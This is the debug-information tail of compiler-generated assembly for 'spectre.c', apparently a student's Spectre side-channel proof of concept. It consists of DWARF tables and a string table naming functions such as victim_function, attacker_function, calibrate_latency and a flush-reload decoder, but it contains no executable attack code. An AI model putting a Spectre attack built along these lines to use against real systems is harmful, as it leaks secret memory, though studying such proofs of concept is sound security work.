	.byte	0
	.uleb128 0x1e
	.long	.LASF136
	.byte	0x2
	.byte	0x2e
	.byte	0xa
	.long	0x768
	.quad	.LFB4214
	.quad	.LFE4214-.LFB4214
	.uleb128 0x1
	.byte	0x9c
	.long	0xd1b
	.uleb128 0x19
	.long	.LASF98
	.byte	0x2
	.byte	0x2f
	.byte	0xe
	.long	0x768
	.uleb128 0x2
	.byte	0x91
	.sleb128 -24
	.byte	0
	.uleb128 0x1e
	.long	.LASF137
	.byte	0x2
	.byte	0x24
	.byte	0xa
	.long	0x768
	.quad	.LFB4213
	.quad	.LFE4213-.LFB4213
	.uleb128 0x1
	.byte	0x9c
	.long	0xd4d
	.uleb128 0x19
	.long	.LASF98
	.byte	0x2
	.byte	0x25
	.byte	0xe
	.long	0x768
	.uleb128 0x2
	.byte	0x91
	.sleb128 -24
	.byte	0
	.uleb128 0x22
	.long	.LASF138
	.byte	0x2
	.byte	0x19
	.byte	0x6
	.quad	.LFB4212
	.quad	.LFE4212-.LFB4212
	.uleb128 0x1
	.byte	0x9c
	.long	0xd89
	.uleb128 0x24
	.long	.LASF139
	.byte	0x2
	.byte	0x19
	.byte	0x1c
	.long	0x2d
	.uleb128 0x2
	.byte	0x91
	.sleb128 -40
	.uleb128 0x1a
	.string	"rl"
	.byte	0x2
	.byte	0x1a
	.byte	0x13
	.long	0x45a
	.uleb128 0x2
	.byte	0x91
	.sleb128 -32
	.byte	0
	.uleb128 0x2a
	.long	.LASF140
	.byte	0x3
	.value	0x5d8
	.byte	0x1
	.byte	0x3
	.uleb128 0x2a
	.long	.LASF141
	.byte	0x3
	.value	0x5d2
	.byte	0x1
	.byte	0x3
	.uleb128 0x2b
	.long	.LASF151
	.byte	0x3
	.value	0x5cc
	.byte	0x1
	.byte	0x3
	.long	0xdb9
	.uleb128 0x2c
	.string	"__A"
	.byte	0x3
	.value	0x5cc
	.byte	0x1a
	.long	0x355
	.byte	0
	.uleb128 0x2d
	.long	.LASF152
	.byte	0x1
	.byte	0x1
	.byte	0x1d
	.long	0x39
	.quad	.LFB6
	.quad	.LFE6-.LFB6
	.uleb128 0x1
	.byte	0x9c
	.uleb128 0x24
	.long	.LASF110
	.byte	0x1
	.byte	0x1
	.byte	0x43
	.long	0x39
	.uleb128 0x2
	.byte	0x91
	.sleb128 -24
	.uleb128 0x24
	.long	.LASF109
	.byte	0x1
	.byte	0x2
	.byte	0x19
	.long	0x39
	.uleb128 0x2
	.byte	0x91
	.sleb128 -32
	.byte	0
	.byte	0
	.section	.debug_abbrev,"",@progbits
.Ldebug_abbrev0:
	.uleb128 0x1
	.uleb128 0x11
	.byte	0x1
	.uleb128 0x25
	.uleb128 0xe
	.uleb128 0x13
	.uleb128 0xb
	.uleb128 0x3
	.uleb128 0xe
	.uleb128 0x1b
	.uleb128 0xe
	.uleb128 0x11
	.uleb128 0x1
	.uleb128 0x12
	.uleb128 0x7
	.uleb128 0x10
	.uleb128 0x17
	.byte	0
	.byte	0
	.uleb128 0x2
	.uleb128 0x16
	.byte	0
	.uleb128 0x3
	.uleb128 0xe
	.uleb128 0x3a
	.uleb128 0xb
	.uleb128 0x3b
	.uleb128 0xb
	.uleb128 0x39
	.uleb128 0xb
	.uleb128 0x49
	.uleb128 0x13
	.byte	0
	.byte	0
	.uleb128 0x3
	.uleb128 0x24
	.byte	0
	.uleb128 0xb
	.uleb128 0xb
	.uleb128 0x3e
	.uleb128 0xb
	.uleb128 0x3
	.uleb128 0xe
	.byte	0
	.byte	0
	.uleb128 0x4
	.uleb128 0xf
	.byte	0
	.uleb128 0xb
	.uleb128 0xb
	.byte	0
	.byte	0
	.uleb128 0x5
	.uleb128 0x24
	.byte	0
	.uleb128 0xb
	.uleb128 0xb
	.uleb128 0x3e
	.uleb128 0xb
	.uleb128 0x3
	.uleb128 0x8
	.byte	0
	.byte	0
	.uleb128 0x6
	.uleb128 0xf
	.byte	0
	.uleb128 0xb
	.uleb128 0xb
	.uleb128 0x49
	.uleb128 0x13
	.byte	0
	.byte	0
	.uleb128 0x7
	.uleb128 0x26
	.byte	0
	.uleb128 0x49
	.uleb128 0x13
	.byte	0
	.byte	0
	.uleb128 0x8
	.uleb128 0x13
	.byte	0x1
	.uleb128 0x3
	.uleb128 0xe
	.uleb128 0xb
	.uleb128 0xb
	.uleb128 0x3a
	.uleb128 0xb
	.uleb128 0x3b
	.uleb128 0xb
	.uleb128 0x39
	.uleb128 0xb
	.uleb128 0x1
	.uleb128 0x13
	.byte	0
	.byte	0
	.uleb128 0x9
	.uleb128 0xd
	.byte	0
	.uleb128 0x3
	.uleb128 0xe
	.uleb128 0x3a
	.uleb128 0xb
	.uleb128 0x3b
	.uleb128 0xb
	.uleb128 0x39
	.uleb128 0xb
	.uleb128 0x49
	.uleb128 0x13
	.uleb128 0x38
	.uleb128 0xb
	.byte	0
	.byte	0
	.uleb128 0xa
	.uleb128 0x16
	.byte	0
	.uleb128 0x3
	.uleb128 0xe
	.uleb128 0x3a
	.uleb128 0xb
	.uleb128 0x3b
	.uleb128 0xb
	.uleb128 0x39
	.uleb128 0xb
	.byte	0
	.byte	0
	.uleb128 0xb
	.uleb128 0x13
	.byte	0
	.uleb128 0x3
	.uleb128 0xe
	.uleb128 0x3c
	.uleb128 0x19
	.byte	0
	.byte	0
	.uleb128 0xc
	.uleb128 0x1
	.byte	0x1
	.uleb128 0x49
	.uleb128 0x13
	.uleb128 0x1
	.uleb128 0x13
	.byte	0
	.byte	0
	.uleb128 0xd
	.uleb128 0x21
	.byte	0
	.uleb128 0x49
	.uleb128 0x13
	.uleb128 0x2f
	.uleb128 0xb
	.byte	0
	.byte	0
	.uleb128 0xe
	.uleb128 0x34
	.byte	0
	.uleb128 0x3
	.uleb128 0xe
	.uleb128 0x3a
	.uleb128 0xb
	.uleb128 0x3b
	.uleb128 0xb
	.uleb128 0x39
	.uleb128 0xb
	.uleb128 0x49
	.uleb128 0x13
	.uleb128 0x3f
	.uleb128 0x19
	.uleb128 0x3c
	.uleb128 0x19
	.byte	0
	.byte	0
	.uleb128 0xf
	.uleb128 0x21
	.byte	0
	.byte	0
	.byte	0
	.uleb128 0x10
	.uleb128 0x35
	.byte	0
	.uleb128 0x49
	.uleb128 0x13
	.byte	0
	.byte	0
	.uleb128 0x11
	.uleb128 0x26
	.byte	0
	.byte	0
	.byte	0
	.uleb128 0x12
	.uleb128 0x4
	.byte	0x1
	.uleb128 0x3e
	.uleb128 0xb
	.uleb128 0xb
	.uleb128 0xb
	.uleb128 0x49
	.uleb128 0x13
	.uleb128 0x3a
	.uleb128 0xb
	.uleb128 0x3b
	.uleb128 0xb
	.uleb128 0x39
	.uleb128 0xb
	.uleb128 0x1
	.uleb128 0x13
	.byte	0
	.byte	0
	.uleb128 0x13
	.uleb128 0x28
	.byte	0
	.uleb128 0x3
	.uleb128 0xe
	.uleb128 0x1c
	.uleb128 0x5
	.byte	0
	.byte	0
	.uleb128 0x14
	.uleb128 0x28
	.byte	0
	.uleb128 0x3
	.uleb128 0xe
	.uleb128 0x1c
	.uleb128 0xb
	.byte	0
	.byte	0
	.uleb128 0x15
	.uleb128 0x4
	.byte	0x1
	.uleb128 0x3
	.uleb128 0xe
	.uleb128 0x3e
	.uleb128 0xb
	.uleb128 0xb
	.uleb128 0xb
	.uleb128 0x49
	.uleb128 0x13
	.uleb128 0x3a
	.uleb128 0xb
	.uleb128 0x3b
	.uleb128 0xb
	.uleb128 0x39
	.uleb128 0xb
	.uleb128 0x1
	.uleb128 0x13
	.byte	0
	.byte	0
	.uleb128 0x16
	.uleb128 0x34
	.byte	0
	.uleb128 0x3
	.uleb128 0xe
	.uleb128 0x3a
	.uleb128 0xb
	.uleb128 0x3b
	.uleb128 0xb
	.uleb128 0x39
	.uleb128 0xb
	.uleb128 0x49
	.uleb128 0x13
	.uleb128 0x3f
	.uleb128 0x19
	.uleb128 0x2
	.uleb128 0x18
	.byte	0
	.byte	0
	.uleb128 0x17
	.uleb128 0x2e
	.byte	0
	.uleb128 0x3f
	.uleb128 0x19
	.uleb128 0x3
	.uleb128 0xe
	.uleb128 0x3a
	.uleb128 0xb
	.uleb128 0x3b
	.uleb128 0xb
	.uleb128 0x39
	.uleb128 0xb
	.uleb128 0x49
	.uleb128 0x13
	.uleb128 0x11
	.uleb128 0x1
	.uleb128 0x12
	.uleb128 0x7
	.uleb128 0x40
	.uleb128 0x18
	.uleb128 0x2116
	.uleb128 0x19
	.byte	0
	.byte	0
	.uleb128 0x18
	.uleb128 0x2e
	.byte	0x1
	.uleb128 0x3f
	.uleb128 0x19
	.uleb128 0x3
	.uleb128 0xe
	.uleb128 0x3a
	.uleb128 0xb
	.uleb128 0x3b
	.uleb128 0xb
	.uleb128 0x39
	.uleb128 0xb
	.uleb128 0x11
	.uleb128 0x1
	.uleb128 0x12
	.uleb128 0x7
	.uleb128 0x40
	.uleb128 0x18
	.uleb128 0x2116
	.uleb128 0x19
	.uleb128 0x1
	.uleb128 0x13
	.byte	0
	.byte	0
	.uleb128 0x19
	.uleb128 0x34
	.byte	0
	.uleb128 0x3
	.uleb128 0xe
	.uleb128 0x3a
	.uleb128 0xb
	.uleb128 0x3b
	.uleb128 0xb
	.uleb128 0x39
	.uleb128 0xb
	.uleb128 0x49
	.uleb128 0x13
	.uleb128 0x2
	.uleb128 0x18
	.byte	0
	.byte	0
	.uleb128 0x1a
	.uleb128 0x34
	.byte	0
	.uleb128 0x3
	.uleb128 0x8
	.uleb128 0x3a
	.uleb128 0xb
	.uleb128 0x3b
	.uleb128 0xb
	.uleb128 0x39
	.uleb128 0xb
	.uleb128 0x49
	.uleb128 0x13
	.uleb128 0x2
	.uleb128 0x18
	.byte	0
	.byte	0
	.uleb128 0x1b
	.uleb128 0xb
	.byte	0x1
	.uleb128 0x11
	.uleb128 0x1
	.uleb128 0x12
	.uleb128 0x7
	.byte	0
	.byte	0
	.uleb128 0x1c
	.uleb128 0xb
	.byte	0x1
	.uleb128 0x11
	.uleb128 0x1
	.uleb128 0x12
	.uleb128 0x7
	.uleb128 0x1
	.uleb128 0x13
	.byte	0
	.byte	0
	.uleb128 0x1d
	.uleb128 0x1d
	.byte	0
	.uleb128 0x31
	.uleb128 0x13
	.uleb128 0x11
	.uleb128 0x1
	.uleb128 0x12
	.uleb128 0x7
	.uleb128 0x58
	.uleb128 0xb
	.uleb128 0x59
	.uleb128 0xb
	.uleb128 0x57
	.uleb128 0xb
	.byte	0
	.byte	0
	.uleb128 0x1e
	.uleb128 0x2e
	.byte	0x1
	.uleb128 0x3f
	.uleb128 0x19
	.uleb128 0x3
	.uleb128 0xe
	.uleb128 0x3a
	.uleb128 0xb
	.uleb128 0x3b
	.uleb128 0xb
	.uleb128 0x39
	.uleb128 0xb
	.uleb128 0x49
	.uleb128 0x13
	.uleb128 0x11
	.uleb128 0x1
	.uleb128 0x12
	.uleb128 0x7
	.uleb128 0x40
	.uleb128 0x18
	.uleb128 0x2116
	.uleb128 0x19
	.uleb128 0x1
	.uleb128 0x13
	.byte	0
	.byte	0
	.uleb128 0x1f
	.uleb128 0x34
	.byte	0
	.uleb128 0x3
	.uleb128 0xe
	.uleb128 0x49
	.uleb128 0x13
	.uleb128 0x34
	.uleb128 0x19
	.uleb128 0x2
	.uleb128 0x18
	.byte	0
	.byte	0
	.uleb128 0x20
	.uleb128 0x1d
	.byte	0x1
	.uleb128 0x31
	.uleb128 0x13
	.uleb128 0x11
	.uleb128 0x1
	.uleb128 0x12
	.uleb128 0x7
	.uleb128 0x58
	.uleb128 0xb
	.uleb128 0x59
	.uleb128 0xb
	.uleb128 0x57
	.uleb128 0xb
	.byte	0
	.byte	0
	.uleb128 0x21
	.uleb128 0x5
	.byte	0
	.uleb128 0x31
	.uleb128 0x13
	.uleb128 0x2
	.uleb128 0x18
	.byte	0
	.byte	0
	.uleb128 0x22
	.uleb128 0x2e
	.byte	0x1
	.uleb128 0x3f
	.uleb128 0x19
	.uleb128 0x3
	.uleb128 0xe
	.uleb128 0x3a
	.uleb128 0xb
	.uleb128 0x3b
	.uleb128 0xb
	.uleb128 0x39
	.uleb128 0xb
	.uleb128 0x27
	.uleb128 0x19
	.uleb128 0x11
	.uleb128 0x1
	.uleb128 0x12
	.uleb128 0x7
	.uleb128 0x40
	.uleb128 0x18
	.uleb128 0x2116
	.uleb128 0x19
	.uleb128 0x1
	.uleb128 0x13
	.byte	0
	.byte	0
	.uleb128 0x23
	.uleb128 0x5
	.byte	0
	.uleb128 0x3
	.uleb128 0x8
	.uleb128 0x3a
	.uleb128 0xb
	.uleb128 0x3b
	.uleb128 0xb
	.uleb128 0x39
	.uleb128 0xb
	.uleb128 0x49
	.uleb128 0x13
	.uleb128 0x2
	.uleb128 0x18
	.byte	0
	.byte	0
	.uleb128 0x24
	.uleb128 0x5
	.byte	0
	.uleb128 0x3
	.uleb128 0xe
	.uleb128 0x3a
	.uleb128 0xb
	.uleb128 0x3b
	.uleb128 0xb
	.uleb128 0x39
	.uleb128 0xb
	.uleb128 0x49
	.uleb128 0x13
	.uleb128 0x2
	.uleb128 0x18
	.byte	0
	.byte	0
	.uleb128 0x25
	.uleb128 0x2e
	.byte	0x1
	.uleb128 0x3f
	.uleb128 0x19
	.uleb128 0x3
	.uleb128 0xe
	.uleb128 0x3a
	.uleb128 0xb
	.uleb128 0x3b
	.uleb128 0xb
	.uleb128 0x39
	.uleb128 0xb
	.uleb128 0x27
	.uleb128 0x19
	.uleb128 0x11
	.uleb128 0x1
	.uleb128 0x12
	.uleb128 0x7
	.uleb128 0x40
	.uleb128 0x18
	.uleb128 0x2117
	.uleb128 0x19
	.uleb128 0x1
	.uleb128 0x13
	.byte	0
	.byte	0
	.uleb128 0x26
	.uleb128 0x2e
	.byte	0x1
	.uleb128 0x3f
	.uleb128 0x19
	.uleb128 0x3
	.uleb128 0xe
	.uleb128 0x3a
	.uleb128 0xb
	.uleb128 0x3b
	.uleb128 0xb
	.uleb128 0x39
	.uleb128 0xb
	.uleb128 0x27
	.uleb128 0x19
	.uleb128 0x49
	.uleb128 0x13
	.uleb128 0x11
	.uleb128 0x1
	.uleb128 0x12
	.uleb128 0x7
	.uleb128 0x40
	.uleb128 0x18
	.uleb128 0x2117
	.uleb128 0x19
	.uleb128 0x1
	.uleb128 0x13
	.byte	0
	.byte	0
	.uleb128 0x27
	.uleb128 0x2e
	.byte	0x1
	.uleb128 0x3f
	.uleb128 0x19
	.uleb128 0x3
	.uleb128 0xe
	.uleb128 0x3a
	.uleb128 0xb
	.uleb128 0x3b
	.uleb128 0xb
	.uleb128 0x39
	.uleb128 0xb
	.uleb128 0x27
	.uleb128 0x19
	.uleb128 0x49
	.uleb128 0x13
	.uleb128 0x11
	.uleb128 0x1
	.uleb128 0x12
	.uleb128 0x7
	.uleb128 0x40
	.uleb128 0x18
	.uleb128 0x2116
	.uleb128 0x19
	.uleb128 0x1
	.uleb128 0x13
	.byte	0
	.byte	0
	.uleb128 0x28
	.uleb128 0x2e
	.byte	0x1
	.uleb128 0x3
	.uleb128 0xe
	.uleb128 0x3a
	.uleb128 0xb
	.uleb128 0x3b
	.uleb128 0xb
	.uleb128 0x39
	.uleb128 0xb
	.uleb128 0x27
	.uleb128 0x19
	.uleb128 0x49
	.uleb128 0x13
	.uleb128 0x11
	.uleb128 0x1
	.uleb128 0x12
	.uleb128 0x7
	.uleb128 0x40
	.uleb128 0x18
	.uleb128 0x2116
	.uleb128 0x19
	.uleb128 0x1
	.uleb128 0x13
	.byte	0
	.byte	0
	.uleb128 0x29
	.uleb128 0x1d
	.byte	0x1
	.uleb128 0x31
	.uleb128 0x13
	.uleb128 0x11
	.uleb128 0x1
	.uleb128 0x12
	.uleb128 0x7
	.uleb128 0x58
	.uleb128 0xb
	.uleb128 0x59
	.uleb128 0xb
	.uleb128 0x57
	.uleb128 0xb
	.uleb128 0x1
	.uleb128 0x13
	.byte	0
	.byte	0
	.uleb128 0x2a
	.uleb128 0x2e
	.byte	0
	.uleb128 0x3f
	.uleb128 0x19
	.uleb128 0x3
	.uleb128 0xe
	.uleb128 0x3a
	.uleb128 0xb
	.uleb128 0x3b
	.uleb128 0x5
	.uleb128 0x39
	.uleb128 0xb
	.uleb128 0x27
	.uleb128 0x19
	.uleb128 0x20
	.uleb128 0xb
	.uleb128 0x34
	.uleb128 0x19
	.byte	0
	.byte	0
	.uleb128 0x2b
	.uleb128 0x2e
	.byte	0x1
	.uleb128 0x3f
	.uleb128 0x19
	.uleb128 0x3
	.uleb128 0xe
	.uleb128 0x3a
	.uleb128 0xb
	.uleb128 0x3b
	.uleb128 0x5
	.uleb128 0x39
	.uleb128 0xb
	.uleb128 0x27
	.uleb128 0x19
	.uleb128 0x20
	.uleb128 0xb
	.uleb128 0x34
	.uleb128 0x19
	.uleb128 0x1
	.uleb128 0x13
	.byte	0
	.byte	0
	.uleb128 0x2c
	.uleb128 0x5
	.byte	0
	.uleb128 0x3
	.uleb128 0x8
	.uleb128 0x3a
	.uleb128 0xb
	.uleb128 0x3b
	.uleb128 0x5
	.uleb128 0x39
	.uleb128 0xb
	.uleb128 0x49
	.uleb128 0x13
	.byte	0
	.byte	0
	.uleb128 0x2d
	.uleb128 0x2e
	.byte	0x1
	.uleb128 0x3
	.uleb128 0xe
	.uleb128 0x3a
	.uleb128 0xb
	.uleb128 0x3b
	.uleb128 0xb
	.uleb128 0x39
	.uleb128 0xb
	.uleb128 0x27
	.uleb128 0x19
	.uleb128 0x49
	.uleb128 0x13
	.uleb128 0x11
	.uleb128 0x1
	.uleb128 0x12
	.uleb128 0x7
	.uleb128 0x40
	.uleb128 0x18
	.uleb128 0x2117
	.uleb128 0x19
	.byte	0
	.byte	0
	.byte	0
	.section	.debug_aranges,"",@progbits
	.long	0x2c
	.value	0x2
	.long	.Ldebug_info0
	.byte	0x8
	.byte	0
	.value	0
	.value	0
	.quad	.Ltext0
	.quad	.Letext0-.Ltext0
	.quad	0
	.quad	0
	.section	.debug_line,"",@progbits
.Ldebug_line0:
	.section	.debug_str,"MS",@progbits,1
.LASF132:
	.string	"transmission"
.LASF78:
	.string	"__RLIMIT_RSS"
.LASF66:
	.string	"_ISgraph"
.LASF90:
	.string	"__RLIMIT_NLIMITS"
.LASF28:
	.string	"_chain"
.LASF125:
	.string	"pred"
.LASF5:
	.string	"size_t"
.LASF56:
	.string	"uintptr_t"
.LASF34:
	.string	"_shortbuf"
.LASF75:
	.string	"RLIMIT_DATA"
.LASF6:
	.string	"__uint8_t"
.LASF139:
	.string	"limit_bytes"
.LASF64:
	.string	"_ISspace"
.LASF16:
	.string	"_IO_read_ptr"
.LASF100:
	.string	"pages"
.LASF22:
	.string	"_IO_buf_base"
.LASF151:
	.string	"_mm_clflush"
.LASF58:
	.string	"long long unsigned int"
.LASF138:
	.string	"set_heap_limit"
.LASF146:
	.string	"__rlimit_resource"
.LASF61:
	.string	"_ISalpha"
.LASF37:
	.string	"_codecvt"
.LASF62:
	.string	"_ISdigit"
.LASF150:
	.string	"realloc_wrapper"
.LASF57:
	.string	"long long int"
.LASF4:
	.string	"signed char"
.LASF149:
	.string	"__PRETTY_FUNCTION__"
.LASF111:
	.string	"_NO_USE"
.LASF29:
	.string	"_fileno"
.LASF17:
	.string	"_IO_read_end"
.LASF136:
	.string	"array_init"
.LASF9:
	.string	"long int"
.LASF97:
	.string	"array_size"
.LASF123:
	.string	"flush_lines"
.LASF15:
	.string	"_flags"
.LASF128:
	.string	"victim_function"
.LASF70:
	.string	"_ISalnum"
.LASF32:
	.string	"_cur_column"
.LASF46:
	.string	"_IO_codecvt"
.LASF72:
	.string	"double"
.LASF106:
	.string	"safe_index"
.LASF31:
	.string	"_old_offset"
.LASF36:
	.string	"_offset"
.LASF98:
	.string	"array"
.LASF140:
	.string	"_mm_mfence"
.LASF152:
	.string	"array_index_mask_nospec"
.LASF73:
	.string	"RLIMIT_CPU"
.LASF8:
	.string	"__uint32_t"
.LASF126:
	.string	"mask"
.LASF131:
	.string	"new_idx"
.LASF127:
	.string	"csel"
.LASF69:
	.string	"_ISpunct"
.LASF89:
	.string	"__RLIMIT_RTTIME"
.LASF45:
	.string	"_IO_marker"
.LASF48:
	.string	"stdin"
.LASF1:
	.string	"unsigned int"
.LASF80:
	.string	"__RLIMIT_OFILE"
.LASF96:
	.string	"rlim_max"
.LASF141:
	.string	"_mm_lfence"
.LASF143:
	.string	"spectre.c"
.LASF0:
	.string	"long unsigned int"
.LASF129:
	.string	"page"
.LASF20:
	.string	"_IO_write_ptr"
.LASF82:
	.string	"__RLIMIT_NPROC"
.LASF51:
	.string	"sys_nerr"
.LASF114:
	.string	"data"
.LASF109:
	.string	"size"
.LASF3:
	.string	"short unsigned int"
.LASF74:
	.string	"RLIMIT_FSIZE"
.LASF92:
	.string	"rlim_t"
.LASF24:
	.string	"_IO_save_base"
.LASF117:
	.string	"decode_flush_reload_state"
.LASF35:
	.string	"_lock"
.LASF84:
	.string	"__RLIMIT_LOCKS"
.LASF30:
	.string	"_flags2"
.LASF42:
	.string	"_mode"
.LASF49:
	.string	"stdout"
.LASF107:
	.string	"malicious_size"
.LASF135:
	.string	"new_size"
.LASF38:
	.string	"_wide_data"
.LASF99:
	.string	"secret"
.LASF87:
	.string	"__RLIMIT_NICE"
.LASF13:
	.string	"__rlim_t"
.LASF60:
	.string	"_ISlower"
.LASF77:
	.string	"RLIMIT_CORE"
.LASF102:
	.string	"hits"
.LASF94:
	.string	"rlimit"
.LASF55:
	.string	"uint64_t"
.LASF145:
	.string	"_IO_lock_t"
.LASF93:
	.string	"_IO_FILE"
.LASF142:
	.string	"GNU C17 8.5.0 20210514 (Red Hat 8.5.0-28) -mtune=generic -march=x86-64 -g"
.LASF11:
	.string	"__off_t"
.LASF10:
	.string	"__uint64_t"
.LASF71:
	.string	"float"
.LASF85:
	.string	"__RLIMIT_SIGPENDING"
.LASF52:
	.string	"sys_errlist"
.LASF91:
	.string	"__RLIM_NLIMITS"
.LASF88:
	.string	"__RLIMIT_RTPRIO"
.LASF27:
	.string	"_markers"
.LASF101:
	.string	"threshold"
.LASF112:
	.string	"_Bool"
.LASF2:
	.string	"unsigned char"
.LASF23:
	.string	"_IO_buf_end"
.LASF7:
	.string	"short int"
.LASF33:
	.string	"_vtable_offset"
.LASF103:
	.string	"array_base"
.LASF67:
	.string	"_ISblank"
.LASF44:
	.string	"FILE"
.LASF119:
	.string	"scd_most_hits"
.LASF124:
	.string	"stride"
.LASF54:
	.string	"uint32_t"
.LASF122:
	.string	"scd_c"
.LASF14:
	.string	"char"
.LASF81:
	.string	"RLIMIT_AS"
.LASF108:
	.string	"is_attack"
.LASF95:
	.string	"rlim_cur"
.LASF68:
	.string	"_IScntrl"
.LASF63:
	.string	"_ISxdigit"
.LASF110:
	.string	"index"
.LASF148:
	.string	"attacker_function"
.LASF130:
	.string	"new_array_size"
.LASF116:
	.string	"calibrate_latency"
.LASF12:
	.string	"__off64_t"
.LASF18:
	.string	"_IO_read_base"
.LASF26:
	.string	"_IO_save_end"
.LASF144:
	.string	"/home/ecelrc/students/phan2/spectre-poc"
.LASF121:
	.string	"scd_raw_c"
.LASF41:
	.string	"__pad5"
.LASF113:
	.string	"miss"
.LASF21:
	.string	"_IO_write_end"
.LASF43:
	.string	"_unused2"
.LASF50:
	.string	"stderr"
.LASF137:
	.string	"secret_init"
.LASF79:
	.string	"RLIMIT_NOFILE"
.LASF76:
	.string	"RLIMIT_STACK"
.LASF83:
	.string	"__RLIMIT_MEMLOCK"
.LASF59:
	.string	"_ISupper"
.LASF40:
	.string	"_freeres_buf"
.LASF53:
	.string	"uint8_t"
.LASF25:
	.string	"_IO_backup_base"
.LASF120:
	.string	"raw_c"
.LASF118:
	.string	"most_hits"
.LASF39:
	.string	"_freeres_list"
.LASF134:
	.string	"old_size"
.LASF47:
	.string	"_IO_wide_data"
.LASF115:
	.string	"start"
.LASF133:
	.string	"_mask"
.LASF105:
	.string	"safe_size"
.LASF147:
	.string	"main"
.LASF19:
	.string	"_IO_write_base"
.LASF65:
	.string	"_ISprint"
.LASF104:
	.string	"malicious_index"
.LASF86:
	.string	"__RLIMIT_MSGQUEUE"
	.ident	"GCC: (GNU) 8.5.0 20210514 (Red Hat 8.5.0-28)"
	.section	.note.GNU-stack,"",@progbits
